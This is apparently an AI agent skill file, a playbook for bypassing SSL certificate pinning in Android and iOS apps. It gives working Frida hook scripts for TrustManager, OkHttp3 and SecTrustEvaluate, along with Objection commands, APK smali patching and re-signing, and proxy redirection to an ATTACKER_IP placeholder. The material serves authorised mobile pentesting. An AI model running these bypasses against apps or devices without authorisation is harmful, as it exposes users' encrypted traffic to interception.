---
name: mobile-ssl-pinning-bypass
description: SSL/TLS pinning bypass for Android and iOS apps — Frida hooks for OkHttp/TrustManager/NSURLSession, Objection automated bypass, ProxyDroid setup, manual APK patching (smali), certificate store manipulation, and testing custom pinning implementations.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: Mobile SSL Pinning Bypass — Expert Playbook

> **AI LOAD INSTRUCTION**: SSL pinning prevents MITM proxying of mobile app traffic. Covers all major bypass techniques: Frida hooks for Android (OkHttp, TrustManager, Conscrypt) and iOS (NSURLSession, AFNetworking, TrustKit), Objection automated bypass, manual APK smali patching, and rooted device certificate trust. Base models often suggest only Objection without covering manual approaches for hardened apps.

## 0. RELATED ROUTING

- android-pentesting — broad Android pentest methodology
- ios-pentesting-tricks — iOS runtime manipulation

---

## 1. ANDROID SSL PINNING BYPASS

### Method 1: Objection (Automated, Frida-based)

```bash
# Install objection:
pip3 install objection

# Start the app, then:
objection -g com.target.app explore

# In objection prompt:
android sslpinning disable

# Or with Frida directly:
frida -U -f com.target.app --no-pause -l ssl_bypass.js
```

### Method 2: Frida Script — Universal SSL Bypass

```javascript
// ssl_bypass.js — covers OkHttp3, TrustManager, Conscrypt, Appcelerator
Java.perform(function() {
    // Bypass TrustManager
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    var TrustManager = Java.registerClass({
        name: 'com.sslpinning.UnSafeHostnameVerifier',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var TrustManagers = [TrustManager.$new()];
    var SSLContextInstance = SSLContext.getInstance('TLS');
    SSLContextInstance.init(null, TrustManagers, null);
    
    // Override getDefault
    SSLContext.getDefault.implementation = function() {
        return SSLContextInstance;
    };
});
```

### Method 3: Frida Script — OkHttp3 Specific

```javascript
Java.perform(function() {
    // OkHttp3 CertificatePinner bypass
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
            console.log("Bypassed OkHttp3 CertificatePinner for: " + hostname);
            return;
        };
        CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;').implementation = function(hostname, certs) {
            return;
        };
    } catch(e) {
        console.log("OkHttp3 CertificatePinner not found: " + e);
    }
    
    // TrustKit (Android) bypass
    try {
        var TrustManagerBuilder = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        TrustManagerBuilder.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function(host, session) {
            return true;
        };
    } catch(e) {}
});
```

### Method 4: APK Patching (No Root)

```bash
# 1. Decompile APK
apktool d target.apk -o decompiled/

# 2. Find network security config or pinning code:
grep -r "CertificatePinner\|pin\|certificate" decompiled/smali/

# 3. Add network_security_config.xml to allow user certs:
# res/xml/network_security_config.xml:
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="user"/>
        </trust-anchors>
    </debug-overrides>
</network-security-config>

# 4. Add to AndroidManifest.xml:
# android:networkSecurityConfig="@xml/network_security_config"

# 5. Recompile and sign:
apktool b decompiled/ -o patched.apk
# Sign with uber-apk-signer:
java -jar uber-apk-signer.jar -a patched.apk
```

### Method 5: Magisk Module (Rooted)

```bash
# MagiskTrustUserCerts module:
# Install via Magisk Manager → adds user certs to system trust store
# This makes Burp's certificate trusted without patching
```

---

## 2. IOS SSL PINNING BYPASS

### Method 1: Objection (Automated)

```bash
# Attach to running iOS app:
objection -g "com.target.App" explore

# In objection:
ios sslpinning disable
```

### Method 2: Frida Script — iOS

```javascript
// iOS SSL bypass
var TrustResultTypeProceed = 1;

Interceptor.attach(Module.findExportByName("Security", "SecTrustEvaluate"), {
    onLeave: function(retval) {
        retval.replace(0); // errSecSuccess
    }
});

// NSURLSession delegate bypass
var NSURLSession = ObjC.classes.NSURLSession;
// Override URLSession:didReceiveChallenge:completionHandler: to accept all certs
var hook = ObjC.classes.NSObject['- URLSession:didReceiveChallenge:completionHandler:'];
// Swizzle to call completion with NSURLSessionAuthChallengeUseCredential
```

### Method 3: SSL Kill Switch 2 (Cydia/jailbreak)

```
Install via Cydia: SSL Kill Switch 2
Toggle "Disable Certificate Validation" in Settings
Works for NSURLSession, NSURLConnection, AFNetworking
```

### Method 4: Burp Certificate Install (iOS)

```bash
# 1. Configure proxy in device WiFi settings
# 2. Visit http://burpsuite in Safari
# 3. Download Burp certificate
# 4. Settings → Profile Downloaded → Install
# 5. Settings → General → About → Certificate Trust Settings → Enable for Burp
```

---

## 3. PROXY SETUP

### Android ProxyDroid

```bash
# For non-proxy-aware apps (requires root):
# Install ProxyDroid from Magisk or repo
# Set global proxy to Burp IP:8080

# Alternative: adb port forwarding
adb reverse tcp:8080 tcp:8080
# Then set proxy to 127.0.0.1:8080 in WiFi settings
```

### Android Global Proxy (adb)

```bash
# Set proxy:
adb shell settings put global http_proxy ATTACKER_IP:8080

# Remove proxy:
adb shell settings put global http_proxy :0
```

---

## 4. TESTING HARDENED PINNING

### Detect Pinning Implementation

```bash
# Check for common pinning libraries in APK:
unzip -o target.apk -d extracted/
grep -r "okhttp3\|TrustKit\|Picasso\|Volley\|OkHttp\|certificate.pem" extracted/

# Check assets for bundled certificates:
find extracted/assets -name "*.pem" -o -name "*.der" -o -name "*.crt"
```

### Custom Pinning — Manual Smali Patch

If the app implements custom pinning in Smali:

```smali
# Original code that checks certificate hash:
invoke-virtual {v0}, Ljava/security/cert/Certificate;->getEncoded()[B
# ... hash comparison logic ...
# Patch to skip comparison (always return true/success)
```

---

## 5. QUICK DECISION TREE

```
SSL pinning blocking proxy?
├── Android?
│   ├── Rooted device?
│   │   ├── Objection → android sslpinning disable (fastest)
│   │   ├── Frida manual script for specific library
│   │   └── MagiskTrustUserCerts module
│   └── Non-rooted device?
│       ├── APK patching → repack with network_security_config
│       └── Virtual device (emulator with root)
│
└── iOS?
    ├── Jailbroken?
    │   ├── Objection → ios sslpinning disable
    │   └── SSL Kill Switch 2 (Cydia)
    └── Non-jailbroken?
        ├── Install Burp CA via profile (sometimes sufficient)
        └── Resigned IPA with pinning code patched

Still blocked after bypass?
├── App may verify HPKP or use custom TLS stack
├── Inspect traffic in Wireshark to understand protocol
├── Use Frida to hook the specific method directly
└── Check for certificate transparency log matching
```
